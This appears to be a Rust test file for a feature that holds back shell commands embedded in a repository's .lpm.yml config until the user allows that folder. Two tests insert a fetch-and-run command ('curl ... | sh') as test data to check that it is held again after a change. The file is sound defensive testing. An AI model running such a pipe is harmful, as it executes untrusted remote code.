use super::{allow_in, held_in};
use std::collections::BTreeSet;

const REPO: &str = r#"
actions:
  stars:
    label: Stars $(gh api repos/acme/shop --jq .stargazers_count)
    emoji: ⭐
    labelSvg: $(./button.sh)
    cmd: gh repo view --web
    popup:
      html: $(./page.sh)
      data: $(./data.sh)
  deploy:
    label: Deploy {{git.branch}}
    cmd: ./deploy.sh
    inputs:
      env:
        label: Env $(./env-label.sh)
        type: select
        options:
          - $(./first.sh)
          - { label: "Prod $(./prod.sh)", value: prod }
    actions:
      staging:
        label: Staging $(./staging.sh)
        cmd: ./deploy.sh staging
  plain:
    label: Plain
    cmd: echo hi
    popup:
      html: page.html
      data: data.json
"#;

fn set(items: &[&str]) -> BTreeSet<String> {
    items.iter().map(|s| s.to_string()).collect()
}

fn repo(yaml: &str) -> tempfile::TempDir {
    let root = tempfile::tempdir().unwrap();
    std::fs::write(root.path().join(".lpm.yml"), yaml).unwrap();
    root
}

#[test]
fn holds_every_command_the_repo_runs_by_itself() {
    let dir = tempfile::tempdir().unwrap();
    let root = repo(REPO);
    assert_eq!(
        held_in(dir.path(), root.path().to_str().unwrap(), false),
        set(&[
            "gh api repos/acme/shop --jq .stargazers_count",
            "./button.sh",
            "./page.sh",
            "./data.sh",
            "./env-label.sh",
            "./first.sh",
            "./prod.sh",
            "./staging.sh",
            "page page.html",
        ])
    );
}

#[test]
fn allowed_commands_run_and_a_new_one_is_held_again() {
    let dir = tempfile::tempdir().unwrap();
    let root = repo(REPO);
    let path = root.path().to_str().unwrap();
    allow_in(dir.path(), path).unwrap();
    assert!(held_in(dir.path(), path, false).is_empty());

    let changed = REPO.replace("./button.sh", "curl -s https://example.com/x | sh");
    std::fs::write(root.path().join(".lpm.yml"), changed).unwrap();
    assert_eq!(
        held_in(dir.path(), path, false),
        set(&["curl -s https://example.com/x | sh"])
    );
}

#[test]
fn allowing_one_folder_leaves_another_with_the_same_commands_held() {
    let dir = tempfile::tempdir().unwrap();
    let mine = repo(REPO);
    let theirs = repo(REPO);
    allow_in(dir.path(), mine.path().to_str().unwrap()).unwrap();
    assert!(!held_in(dir.path(), theirs.path().to_str().unwrap(), false).is_empty());
}

#[test]
fn nothing_is_held_without_commands_or_for_a_remote_project() {
    let dir = tempfile::tempdir().unwrap();
    let plain = repo("actions:\n  build:\n    label: Build {{git.branch}}\n    cmd: make\n");
    assert!(held_in(dir.path(), plain.path().to_str().unwrap(), false).is_empty());
    let root = repo(REPO);
    assert!(held_in(dir.path(), root.path().to_str().unwrap(), true).is_empty());
    let none = tempfile::tempdir().unwrap();
    assert!(held_in(dir.path(), none.path().to_str().unwrap(), false).is_empty());
}

#[test]
fn an_automation_is_held_as_written_and_again_once_it_changes() {
    let dir = tempfile::tempdir().unwrap();
    let job = "jobs:\n  nightly:\n    schedule: { every: 1h }\n    run: { cmd: ./sync.sh }\n";
    let root = repo(job);
    let path = root.path().to_str().unwrap();
    let held = held_in(dir.path(), path, false);
    assert!(super::holds_job(&held, "nightly"), "{held:?}");
    assert!(!super::holds_job(&held, "night"));

    allow_in(dir.path(), path).unwrap();
    assert!(!super::holds_job(&held_in(dir.path(), path, false), "nightly"));

    std::fs::write(root.path().join(".lpm.yml"), job.replace("./sync.sh", "curl x | sh")).unwrap();
    assert!(super::holds_job(&held_in(dir.path(), path, false), "nightly"));
}

#[test]
fn holds_an_apps_commands_like_a_popups() {
    let dir = tempfile::tempdir().unwrap();
    let root = repo(
        "actions:\n  board:\n    app:\n      html: $(./board.sh)\n      data: $(./issues.sh)\n  same:\n    app: true\n    popup:\n      html: page.html\n      data: $(./same.sh)\n",
    );
    assert_eq!(
        held_in(dir.path(), root.path().to_str().unwrap(), false),
        set(&["./board.sh", "./issues.sh", "page page.html", "./same.sh"])
    );
}

#[test]
fn holds_a_page_from_a_file_since_it_can_run_actions() {
    let dir = tempfile::tempdir().unwrap();
    let root = repo("actions:\n  board:\n    app: scripts/board.html\n    popup:\n      html: $(./page.sh)\n");
    let path = root.path().to_str().unwrap();
    assert_eq!(
        held_in(dir.path(), path, false),
        set(&["page scripts/board.html", "./page.sh"])
    );
    allow_in(dir.path(), path).unwrap();
    assert!(held_in(dir.path(), path, false).is_empty());
}

#[test]
fn holds_a_page_written_in_place_by_its_fingerprint() {
    let dir = tempfile::tempdir().unwrap();
    let yaml = "actions:\n  board:\n    app:\n      html: |\n        <button onclick=\"lpm.run('deploy')\">Deploy</button>\n";
    let root = repo(yaml);
    let path = root.path().to_str().unwrap();
    let held = held_in(dir.path(), path, false);
    let entry = held.iter().next().unwrap().clone();
    assert_eq!(held.len(), 1);
    assert!(entry.starts_with("page written in .lpm.yml ("), "{entry}");
    allow_in(dir.path(), path).unwrap();
    assert!(held_in(dir.path(), path, false).is_empty());

    std::fs::write(root.path().join(".lpm.yml"), yaml.replace("deploy", "wipe")).unwrap();
    assert_eq!(held_in(dir.path(), path, false).len(), 1);
}
